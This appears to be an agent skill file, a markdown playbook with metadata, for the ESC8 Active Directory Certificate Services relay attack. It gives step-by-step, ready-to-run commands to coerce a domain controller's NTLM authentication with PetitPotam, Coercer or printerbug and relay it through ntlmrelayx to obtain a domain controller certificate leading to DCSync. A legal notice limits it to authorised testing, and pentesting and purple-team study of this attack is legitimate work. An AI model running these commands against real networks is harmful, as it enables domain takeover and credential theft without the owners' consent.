---
name: relaying-ntlm-for-adcs-esc8
description: "Uses Impacket ntlmrelayx.py with PetitPotam or Coercer. Signals: AD attacks, domain penetration, domain controller."
zh-signals: "Uses Impacket's ntlmrelayx.py with a coercion tool (PetitPotam, Coercer) 信号:ad攻击,域渗透,域控。"
when-to-use: Uses Impacket's ntlmrelayx.py with a coercion tool (PetitPotam, Coercer,
  printerbug) to relay NTLM authentication from a coerced domain controller into
  the AD CS HTTP web-enrollment endpoint (ESC8), obtaining a DC certificate usable
  via Certipy for PKINIT/DCSync. Use during internal AD penetration tests or purple-team
  exercises when AD CS Web Enrollment lacks Extended Protection for Authentication.
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- ntlm-relay
- adcs
- esc8
- impacket
- certipy
- active-directory
- privilege-escalation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1557.001
---
# Relaying NTLM for ADCS ESC8

> **Legal Notice:** This skill is for authorized penetration testing, red-team engagements, and educational purposes only. Coercing authentication and relaying credentials against systems you do not own or lack explicit written authorization to test is illegal. Operate strictly within a signed rules-of-engagement; ESC8 coercion can affect production domain controllers.

## Overview

ESC8 is one of the Active Directory Certificate Services (AD CS) escalation paths catalogued by SpecterOps in "Certified Pre-Owned." It abuses the AD CS **HTTP web-enrollment endpoint** (`/certsrv/`), which by default supports NTLM authentication and, critically, does **not** enforce HTTPS channel binding or Extended Protection for Authentication (EPA). Because NTLM over HTTP on that endpoint is unprotected, an attacker can **coerce** a privileged machine account (typically a domain controller) into authenticating to an attacker-controlled host, then **relay** that NTLM authentication to the CA's web-enrollment page and request a certificate **as the coerced machine**.

When the relayed victim is a domain controller, the attacker obtains a certificate for the DC's machine account (`DC01$`). That certificate can then be used for Kerberos PKINIT to request a TGT as the DC, recover the DC's NT hash, and ultimately perform DCSync — a full domain compromise. This maps to MITRE ATT&CK **T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay)**, extended here to NTLM relay against an HTTP enrollment service.

The standard toolchain is **Impacket's `ntlmrelayx.py`** (the relay engine, with `--adcs` mode), a coercion tool (**PetitPotam**, **Coercer**, **printerbug.py/dementor**), and **Certipy** for enumeration and for turning the captured certificate into a TGT / NT hash.

## When to Use

- During an internal AD penetration test where AD CS with the HTTP Web Enrollment role is present and EPA is not enforced.
- When you have a foothold (even an unauthenticated network position with a coercion vector) and want a path to Domain Admin via certificate impersonation.
- When validating that the organization has mitigated ESC8 (EPA enabled, HTTP enrollment disabled, RPC/EFSRPC coercion patched).
- During purple-team exercises to test detection of coercion + relay + anomalous certificate enrollment.

## Prerequisites

- A network position that can reach the CA web-enrollment endpoint and a coercion vector to the target DC.
- The CA hostname and an enrollable template that yields client-auth EKU (e.g., `DomainController`, `Machine`).
- Tooling (install from official upstreams):

```bash
# Impacket (provides ntlmrelayx.py / impacket-ntlmrelayx)
pipx install impacket

# Certipy (AD CS enumeration + abuse)
pipx install certipy-ad

# Coercion tools
git clone https://github.com/topotam/PetitPotam.git
pipx install coercer            # https://github.com/p0dalirius/Coercer
# printerbug.py ships with Impacket examples (MS-RPRN)
```

## Objectives

- Enumerate AD CS to confirm an ESC8-vulnerable web-enrollment endpoint.
- Stand up `ntlmrelayx` in `--adcs` mode targeting the CA enrollment URL.
- Coerce a domain controller to authenticate to the relay (PetitPotam/Coercer/printerbug).
- Capture the base64 certificate issued for the DC machine account.
- Use Certipy to convert the certificate into a TGT and recover the DC NT hash.
- Validate domain compromise (DCSync) and document mitigations.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Relevance |
|--------------|------|--------|-----------|
| T1557.001 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Credential Access / Collection | The core ESC8 primitive relays coerced NTLM authentication to the AD CS HTTP endpoint. |
| T1187 | Forced Authentication | Credential Access | PetitPotam/printerbug coerce the DC to authenticate to the attacker. |
| T1649 | Steal or Forge Authentication Certificates | Credential Access | The attack yields a certificate for the DC machine account used for PKINIT. |
| T1003.006 | OS Credential Dumping: DCSync | Credential Access | The recovered DC identity enables DCSync for full domain compromise. |

## Workflow

### 1. Enumerate AD CS for ESC8

Use Certipy to find enabled, vulnerable templates and confirm a web-enrollment endpoint:

```bash
certipy find -u attacker@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -vulnerable -enabled -stdout
```

Look for `ESC8` in the output and note the CA's web-enrollment URL (e.g., `http://ca01.corp.local/certsrv/certfnsh.asp`).

### 2. Start the NTLM relay in ADCS mode

Point `ntlmrelayx` at the CA's web-enrollment endpoint and request a `DomainController` template certificate. `--adcs` enables AD CS relay; `-smb2support` accepts SMB2 coerced auth:

```bash
impacket-ntlmrelayx \
  -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

For relaying a member server/workstation instead of a DC, use `--template Machine` (or `User` for a user account).

### 3. Coerce the domain controller to authenticate

Trigger the DC to authenticate to the relay listener using a coercion primitive.

PetitPotam (MS-EFSRPC):

```bash
# python3 PetitPotam.py <listener/attacker IP> <target DC IP>
python3 PetitPotam.py -u attacker -p 'Password123!' -d corp.local 10.0.0.50 10.0.0.10
```

Coercer (multi-protocol coercion):

```bash
coercer coerce -u attacker -p 'Password123!' -d corp.local -l 10.0.0.50 -t 10.0.0.10
```

printerbug.py (MS-RPRN, ships with Impacket):

```bash
python3 printerbug.py corp.local/attacker:'Password123!'@10.0.0.10 10.0.0.50
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
